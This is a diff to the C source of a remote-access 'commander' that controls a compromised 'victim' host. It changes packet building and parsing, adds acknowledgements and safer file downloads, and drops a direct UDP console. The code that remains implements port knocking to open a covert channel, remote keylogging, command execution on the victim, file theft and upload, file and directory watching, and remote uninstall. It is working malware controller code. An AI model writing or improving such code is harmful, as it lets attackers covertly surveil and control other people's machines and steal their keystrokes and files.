@@ -1,7 +1,9 @@
 #include <arpa/inet.h>
 #include <errno.h>
+#include "keylogger.h"
 #include <pthread.h>
 #include <stdint.h>
+#include "protocol.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -11,57 +13,14 @@
 #include <time.h>
 #include <unistd.h>
 
-#define KNOCK_PORT_COUNT 3
-#define KNOCK_PORT_BASE 5001
-#define CONSOLE_PORT 9998
-#define COLLECTOR_PORT 9999
-#define COVERT_PORT 7777
-#define PACKET_SIZE_MAX 1400
-#define CHECKSUM_SIZE 2
-#define FILE_CHUNK 512
 #define MENU_BUFFER_SIZE 1024
-#define KEYLOGGER_DEVICE_MAX 256
-#define LOCAL_PATH_MAX 1024
-#define REMOTE_PATH_MAX 512
 #define DEFAULT_KNOCK_DELAY_MS 150
-#define DEFAULT_KEYLOGGER_DEVICE "/dev/input/event0"
-#define DEFAULT_KEYLOG_REMOTE "/tmp/victim_keylogger_audit.log"
+#define DEFAULT_KEYLOGGER_DEVICE KEYLOGGER_AUTO_DEVICE
+#define DEFAULT_KEYLOG_REMOTE KEYLOGGER_LOG_FILE
 #define RESPONSE_TIMEOUT_MS 5000
 #define EXEC_RESPONSE_TIMEOUT_MS 30000
 #define MENU_INVALID -1
 #define MENU_EOF     -2
-
-#define CMD_DISCONNECT 0x01
-#define CMD_HEARTBEAT  0x02
-#define CMD_KEYLOG_START 0x10
-#define CMD_KEYLOG_STOP  0x11
-#define CMD_EXEC_CMD      0x30
-#define CMD_EXEC_OUTPUT   0x31
-#define CMD_FILE_GET      0x40
-#define CMD_FILE_DATA     0x41
-#define CMD_FILE_PUT_BEGIN 0x42
-#define CMD_FILE_PUT_CHUNK 0x43
-#define CMD_FILE_PUT_END   0x44
-#define CMD_WATCH_FILE    0x50
-#define CMD_WATCH_DIR     0x51
-#define CMD_UNINSTALL    0xFE
-
-#define CMD_OK    0xF0
-#define CMD_ERROR 0xF1
-#define CMD_ACK   0xF2
-
-#define MSG_DIRECTORY_EVENT 1
-#define MSG_FILE_DATA       2
-#define MSG_COMMAND_OUTPUT  3
-
-#define SEQ_INIT 0x13370000
-#define PAYLOAD_CHUNK_MAX (PACKET_SIZE_MAX - sizeof(covert_header_t) - CHECKSUM_SIZE)
-
-typedef struct __attribute__((packed)) {
-    uint32_t seq_num;
-    uint8_t command;
-    uint16_t payload_len;
-} covert_header_t;
 
 typedef struct {
     int sock;
@@ -73,23 +32,9 @@ typedef struct {
 } session_t;
 
 typedef struct {
-    uint32_t seq_num;
-    uint8_t command;
-    uint16_t payload_len;
-    const uint8_t *payload;
-} parsed_packet_t;
-
-typedef struct {
     char victim_ip[INET_ADDRSTRLEN];
     int auto_connect;
 } commander_config_t;
-
-typedef struct {
-    int message_type;
-    char filename;
-    char payload[FILE_CHUNK];
-    int payload_len;
-} network_message_t;
 
 typedef struct {
     int sock;
@@ -110,12 +55,12 @@ static void sleep_ms(long milliseconds);
 static int session_open(session_t *session, const char *victim_ip);
 static void session_close(session_t *session);
 static int session_send_packet(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len);
+static int session_send_ack(session_t *session);
 static int session_send_command(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len);
 static int session_receive_packet(session_t *session, parsed_packet_t *parsed, uint8_t *packet, size_t packet_size, int timeout_ms);
 static int session_receive_status_response(session_t *session, int print_response);
 static int session_receive_exec_response(session_t *session);
 static int session_receive_file_response(session_t *session, const char *local_path);
-static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len);
 static void print_status_response(const parsed_packet_t *packet);
 static void print_payload_text(const uint8_t *payload, uint16_t payload_len, int trim_nul);
 static void init_collector_listener(collector_listener_t *collector);
@@ -136,11 +81,7 @@ static int transfer_file_to_victim(session_t *session);
 static int watch_file_on_victim(session_t *session);
 static int watch_directory_on_victim(session_t *session);
 static int run_victim_command(session_t *session);
-static int run_direct_console_command(const char *victim_ip, const collector_listener_t *collector);
-static int send_console_command(const char *victim_ip, const char *command);
 static int uninstall_victim(session_t *session, int *exit_requested);
-static uint16_t compute_checksum(const uint8_t *data, size_t len);
-static const char *command_name(uint8_t command);
 static void print_disconnected_menu(const commander_config_t *cfg);
 static void print_connected_menu(const session_t *session);
 static void disconnected_loop(commander_config_t *cfg, session_t *session, const collector_listener_t *collector, int *exit_requested);
@@ -165,14 +106,19 @@ int main(int argc, char **argv) {
 
     printf("Commander started\n");
     if (start_collector_listener(&collector) != 0) {
-        fprintf(stderr, "Collector listener unavailable on UDP port %u; direct console output will not be shown\n",
+        fprintf(stderr, "Collector listener unavailable on UDP port %u; watch events will not be shown\n",
                 (unsigned)COLLECTOR_PORT);
     }
 
     if (cfg.auto_connect) {
         printf("Connecting to %s...\n", cfg.victim_ip);
-        if (port_knock(cfg.victim_ip) == 0 && session_open(&session, cfg.victim_ip) == 0) {
-            printf("Session active with %s\n", session.peer_ip);
+        if (port_knock(cfg.victim_ip) == 0) {
+            sleep_ms(1500);
+            if (session_open(&session, cfg.victim_ip) == 0) {
+                printf("Session active with %s\n", session.peer_ip);
+            } else {
+                fprintf(stderr, "Connection failed\n");
+            }
         } else {
             fprintf(stderr, "Connection failed\n");
         }
@@ -384,35 +330,29 @@ static void session_close(session_t *session) {
 
 static int session_send_packet(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
     uint8_t packet[PACKET_SIZE_MAX];
-    covert_header_t header;
-    uint16_t checksum;
     size_t packet_len;
     ssize_t sent;
+    char error[128];
 
     if (!session->connected || session->sock < 0) {
         fprintf(stderr, "No active session\n");
         return -1;
     }
 
-    if (payload_len > PACKET_SIZE_MAX - sizeof(header) - sizeof(checksum)) {
-        fprintf(stderr, "Payload too large\n");
+    packet_len = protocol_build_packet(
+        session->next_seq++,
+        command,
+        payload,
+        payload_len,
+        packet,
+        sizeof(packet),
+        error,
+        sizeof(error)
+    );
+    if (packet_len == 0) {
+        fprintf(stderr, "Unable to build packet: %s\n", error);
         return -1;
     }
-
-    header.seq_num = htonl(session->next_seq++);
-    header.command = command;
-    header.payload_len = htons(payload_len);
-
-    memcpy(packet, &header, sizeof(header));
-
-    if (payload_len > 0 && payload != NULL) {
-        memcpy(packet + sizeof(header), payload, payload_len);
-    }
-
-    packet_len = sizeof(header) + payload_len;
-    checksum = htons(compute_checksum(packet, packet_len));
-    memcpy(packet + packet_len, &checksum, sizeof(checksum));
-    packet_len += sizeof(checksum);
 
     sent = sendto(
         session->sock,
@@ -429,6 +369,10 @@ static int session_send_packet(session_t *session, uint8_t command, const uint8_
     }
 
     return 0;
+}
+
+static int session_send_ack(session_t *session) {
+    return session_send_packet(session, CMD_ACK, NULL, 0);
 }
 
 static int session_send_command(session_t *session, uint8_t command, const uint8_t *payload, uint16_t payload_len) {
@@ -500,21 +444,26 @@ static int session_receive_packet(session_t *session, parsed_packet_t *parsed, u
             continue;
         }
 
-        if (parse_packet(packet, (size_t)received, parsed, error, sizeof(error)) != 0) {
+        if (protocol_parse_packet(packet, (size_t)received, parsed, error, sizeof(error)) != 0) {
             fprintf(stderr, "Invalid victim response: %s\n", error);
             return -1;
         }
 
-        if (parsed->seq_num != session->expected_response_seq) {
-            printf("Response sequence notice: received 0x%08x, expected 0x%08x\n",
+        if (parsed->seq_num < session->expected_response_seq) {
+            printf("Ignoring stale response sequence 0x%08x (expected 0x%08x)\n",
                    parsed->seq_num,
                    session->expected_response_seq);
+            continue;
         }
 
-        if (parsed->seq_num >= session->expected_response_seq) {
-            session->expected_response_seq = parsed->seq_num + 1;
+        if (parsed->seq_num != session->expected_response_seq) {
+            fprintf(stderr, "Response sequence mismatch: received 0x%08x, expected 0x%08x\n",
+                    parsed->seq_num,
+                    session->expected_response_seq);
+            return -1;
         }
 
+        session->expected_response_seq++;
         return 0;
     }
 }
@@ -556,6 +505,10 @@ static int session_receive_exec_response(session_t *session) {
                 output_ended_with_newline = parsed.payload[parsed.payload_len - 1] == '\n';
             }
             fflush(stdout);
+
+            if (session_send_ack(session) != 0) {
+                return -1;
+            }
             continue;
         }
 
@@ -571,19 +524,21 @@ static int session_receive_exec_response(session_t *session) {
 static int session_receive_file_response(session_t *session, const char *local_path) {
     uint8_t packet[PACKET_SIZE_MAX];
     parsed_packet_t parsed;
+    char temp_path[LOCAL_PATH_MAX + 8];
     FILE *fp;
     int write_failed = 0;
 
-    fp = fopen(local_path, "wb");
+    snprintf(temp_path, sizeof(temp_path), "%s.part", local_path);
+    fp = fopen(temp_path, "wb");
     if (fp == NULL) {
-        fprintf(stderr, "Unable to open %s for writing: %s\n", local_path, strerror(errno));
+        fprintf(stderr, "Unable to open %s for writing: %s\n", temp_path, strerror(errno));
         return -1;
     }
 
     while (1) {
         if (session_receive_packet(session, &parsed, packet, sizeof(packet), EXEC_RESPONSE_TIMEOUT_MS) != 0) {
             fclose(fp);
-            remove(local_path);
+            remove(temp_path);
             return -1;
         }
 
@@ -591,22 +546,34 @@ static int session_receive_file_response(session_t *session, const char *local_p
             if (!write_failed &&
                 parsed.payload_len > 0 &&
                 fwrite(parsed.payload, 1, parsed.payload_len, fp) != parsed.payload_len) {
-                fprintf(stderr, "Failed to write %s: %s\n", local_path, strerror(errno));
+                fprintf(stderr, "Failed to write %s: %s\n", temp_path, strerror(errno));
                 write_failed = 1;
+            }
+
+            if (session_send_ack(session) != 0) {
+                fclose(fp);
+                remove(temp_path);
+                return -1;
             }
             continue;
         }
 
         fclose(fp);
         if (write_failed) {
-            remove(local_path);
-            fprintf(stderr, "Discarded incomplete local file %s\n", local_path);
+            remove(temp_path);
+            fprintf(stderr, "Discarded incomplete local file %s\n", temp_path);
             return -1;
         }
 
         print_status_response(&parsed);
         if (parsed.command == CMD_ERROR) {
-            remove(local_path);
+            remove(temp_path);
+            return -1;
+        }
+
+        if (rename(temp_path, local_path) != 0) {
+            fprintf(stderr, "Failed to rename %s to %s: %s\n", temp_path, local_path, strerror(errno));
+            remove(temp_path);
             return -1;
         }
 
@@ -614,51 +581,8 @@ static int session_receive_file_response(session_t *session, const char *local_p
     }
 }
 
-static int parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len) {
-    covert_header_t header;
-    uint16_t payload_len;
-    uint16_t received_checksum;
-    uint16_t computed_checksum;
-    size_t expected_len;
-
-    if (packet_len < sizeof(covert_header_t) + sizeof(received_checksum)) {
-        snprintf(error, error_len, "packet too short");
-        return -1;
-    }
-
-    memcpy(&header, packet, sizeof(header));
-    payload_len = ntohs(header.payload_len);
-
-    if (payload_len > PACKET_SIZE_MAX - sizeof(covert_header_t) - sizeof(received_checksum)) {
-        snprintf(error, error_len, "payload too large");
-        return -1;
-    }
-
-    expected_len = sizeof(covert_header_t) + payload_len + sizeof(received_checksum);
-    if (packet_len != expected_len) {
-        snprintf(error, error_len, "packet length mismatch");
-        return -1;
-    }
-
-    memcpy(&received_checksum, packet + sizeof(covert_header_t) + payload_len, sizeof(received_checksum));
-    received_checksum = ntohs(received_checksum);
-    computed_checksum = compute_checksum(packet, sizeof(covert_header_t) + payload_len);
-
-    if (received_checksum != computed_checksum) {
-        snprintf(error, error_len, "checksum mismatch");
-        return -1;
-    }
-
-    parsed->seq_num = ntohl(header.seq_num);
-    parsed->command = header.command;
-    parsed->payload_len = payload_len;
-    parsed->payload = packet + sizeof(covert_header_t);
-
-    return 0;
-}
-
 static void print_status_response(const parsed_packet_t *packet) {
-    printf("Victim %s: ", command_name(packet->command));
+    printf("Victim %s: ", protocol_command_name(packet->command));
     print_payload_text(packet->payload, packet->payload_len, 1);
 }
 
@@ -809,25 +733,11 @@ static void print_collector_message(const network_message_t *incoming) {
         payload_len = strnlen(incoming->payload, sizeof(incoming->payload));
     }
 
-    switch (incoming->message_type) {
-        case MSG_DIRECTORY_EVENT:
-            printf("\n[collector] Alert: ");
-            break;
-        case MSG_FILE_DATA:
-            printf("\n[collector] File data: ");
-            break;
-        case MSG_COMMAND_OUTPUT:
-            if (payload_len == 0) {
-                printf("\n[collector] Command complete\n");
-                fflush(stdout);
-                return;
-            }
-            printf("\n[collector] ");
-            break;
-        default:
-            printf("\n[collector] Message type %d: ", incoming->message_type);
-            break;
+    if (incoming->message_type != MSG_DIRECTORY_EVENT) {
+        return;
     }
+
+    printf("\n[collector] Alert: ");
 
     if (payload_len > 0) {
         fwrite(incoming->payload, 1, payload_len, stdout);
@@ -985,7 +895,7 @@ static int transfer_remote_file_to_local(session_t *session, const char *remote_
 static int transfer_file_to_victim(session_t *session) {
     char local_path[LOCAL_PATH_MAX];
     char remote_path[REMOTE_PATH_MAX];
-    char buffer[PAYLOAD_CHUNK_MAX];
+    char buffer[PROTOCOL_PACKET_PAYLOAD_MAX];
     const char *default_remote;
     FILE *fp;
     size_t bytes_read;
@@ -1083,68 +993,6 @@ static int run_victim_command(session_t *session) {
     return 0;
 }
 
-static int run_direct_console_command(const char *victim_ip, const collector_listener_t *collector) {
-    char command[MENU_BUFFER_SIZE];
-
-    if (read_line("Program/command to run via direct UDP console: ", command, sizeof(command)) != 0) {
-        return -1;
-    }
-
-    if (command[0] == '\0') {
-        fprintf(stderr, "Command cancelled\n");
-        return -1;
-    }
-
-    if (!collector->available) {
-        fprintf(stderr, "Collector listener is unavailable; output may not be visible\n");
-    }
-
-    if (send_console_command(victim_ip, command) != 0) {
-        return -1;
-    }
-
-    printf("Direct console command sent to %s:%u\n", victim_ip, (unsigned)CONSOLE_PORT);
-    return 0;
-}
-
-static int send_console_command(const char *victim_ip, const char *command) {
-    int sock;
-    struct sockaddr_in addr;
-    size_t command_len;
-    ssize_t sent;
-
-    command_len = strlen(command);
-    if (command_len == 0) {
-        return -1;
-    }
-
-    sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("socket");
-        return -1;
-    }
-
-    memset(&addr, 0, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(CONSOLE_PORT);
-
-    if (inet_pton(AF_INET, victim_ip, &addr.sin_addr) != 1) {
-        fprintf(stderr, "Invalid victim IPv4 address: %s\n", victim_ip);
-        close(sock);
-        return -1;
-    }
-
-    sent = sendto(sock, command, command_len, 0, (struct sockaddr *)&addr, sizeof(addr));
-    close(sock);
-
-    if (sent != (ssize_t)command_len) {
-        perror("sendto direct console");
-        return -1;
-    }
-
-    return 0;
-}
-
 static int uninstall_victim(session_t *session, int *exit_requested) {
     if (session_send_command(session, CMD_UNINSTALL, NULL, 0) != 0) {
         return -1;
@@ -1156,67 +1004,12 @@ static int uninstall_victim(session_t *session, int *exit_requested) {
     return 0;
 }
 
-static uint16_t compute_checksum(const uint8_t *data, size_t len) {
-    uint32_t sum = 0;
-
-    for (size_t i = 0; i < len; i++) {
-        sum += data[i];
-        if (sum >> 16) {
-            sum = (sum & 0xFFFFu) + (sum >> 16);
-        }
-    }
-
-    return (uint16_t)(~sum & 0xFFFFu);
-}
-
-static const char *command_name(uint8_t command) {
-    switch (command) {
-        case CMD_DISCONNECT:
-            return "DISCONNECT";
-        case CMD_HEARTBEAT:
-            return "HEARTBEAT";
-        case CMD_KEYLOG_START:
-            return "KEYLOG_START";
-        case CMD_KEYLOG_STOP:
-            return "KEYLOG_STOP";
-        case CMD_EXEC_CMD:
-            return "EXEC_CMD";
-        case CMD_EXEC_OUTPUT:
-            return "EXEC_OUTPUT";
-        case CMD_FILE_GET:
-            return "FILE_GET";
-        case CMD_FILE_DATA:
-            return "FILE_DATA";
-        case CMD_FILE_PUT_BEGIN:
-            return "FILE_PUT_BEGIN";
-        case CMD_FILE_PUT_CHUNK:
-            return "FILE_PUT_CHUNK";
-        case CMD_FILE_PUT_END:
-            return "FILE_PUT_END";
-        case CMD_WATCH_FILE:
-            return "WATCH_FILE";
-        case CMD_WATCH_DIR:
-            return "WATCH_DIR";
-        case CMD_UNINSTALL:
-            return "UNINSTALL";
-        case CMD_OK:
-            return "OK";
-        case CMD_ERROR:
-            return "ERROR";
-        case CMD_ACK:
-            return "ACK";
-        default:
-            return "UNKNOWN";
-    }
-}
-
 static void print_disconnected_menu(const commander_config_t *cfg) {
     printf("\nCommander Menu\n");
     printf("Victim: %s\n", cfg->victim_ip);
     printf("1. Connect to victim\n");
     printf("2. Set victim IP\n");
-    printf("3. Run direct UDP console command\n");
-    printf("4. Exit\n");
+    printf("3. Exit\n");
 }
 
 static void print_connected_menu(const session_t *session) {
@@ -1230,15 +1023,16 @@ static void print_connected_menu(const session_t *session) {
     printf("6. Watch a file on victim\n");
     printf("7. Watch a directory on victim\n");
     printf("8. Run program on victim over covert channel\n");
-    printf("9. Run program on victim over direct UDP console\n");
-    printf("10. Send heartbeat\n");
-    printf("11. Disconnect\n");
-    printf("12. Uninstall victim\n");
-    printf("13. Exit\n");
+    printf("9. Send heartbeat\n");
+    printf("10. Disconnect\n");
+    printf("11. Uninstall victim\n");
+    printf("12. Exit\n");
 }
 
 static void disconnected_loop(commander_config_t *cfg, session_t *session, const collector_listener_t *collector, int *exit_requested) {
     int choice;
+
+    (void)collector;
 
     print_disconnected_menu(cfg);
     choice = read_menu_choice();
@@ -1251,8 +1045,14 @@ static void disconnected_loop(commander_config_t *cfg, session_t *session, const
     switch (choice) {
         case 1:
             printf("Connecting to %s...\n", cfg->victim_ip);
-            if (port_knock(cfg->victim_ip) == 0 && session_open(session, cfg->victim_ip) == 0) {
-                printf("Session active with %s\n", session->peer_ip);
+            if (port_knock(cfg->victim_ip) == 0) {
+                sleep_ms(1500);
+                if (session_open(session, cfg->victim_ip) == 0) {
+                    printf("Session active with %s\n", session->peer_ip);
+                } else {
+                    fprintf(stderr, "Connection failed\n");
+                    session_close(session);
+                }
             } else {
                 fprintf(stderr, "Connection failed\n");
                 session_close(session);
@@ -1262,9 +1062,6 @@ static void disconnected_loop(commander_config_t *cfg, session_t *session, const
             (void)set_victim_ip(cfg);
             break;
         case 3:
-            (void)run_direct_console_command(cfg->victim_ip, collector);
-            break;
-        case 4:
             *exit_requested = 1;
             break;
         default:
@@ -1275,6 +1072,8 @@ static void disconnected_loop(commander_config_t *cfg, session_t *session, const
 
 static void connected_loop(session_t *session, const collector_listener_t *collector, int *exit_requested) {
     int choice;
+
+    (void)collector;
 
     print_connected_menu(session);
     choice = read_menu_choice();
@@ -1313,19 +1112,16 @@ static void connected_loop(session_t *session, const collector_listener_t *colle
             (void)run_victim_command(session);
             break;
         case 9:
-            (void)run_direct_console_command(session->peer_ip, collector);
-            break;
-        case 10:
             (void)session_send_command(session, CMD_HEARTBEAT, NULL, 0);
             break;
-        case 11:
+        case 10:
             (void)session_send_command(session, CMD_DISCONNECT, NULL, 0);
             session_close(session);
             break;
-        case 12:
+        case 11:
             (void)uninstall_victim(session, exit_requested);
             break;
-        case 13:
+        case 12:
             printf("Disconnect before exiting so the session ends cleanly.\n");
             *exit_requested = 0;
             break;
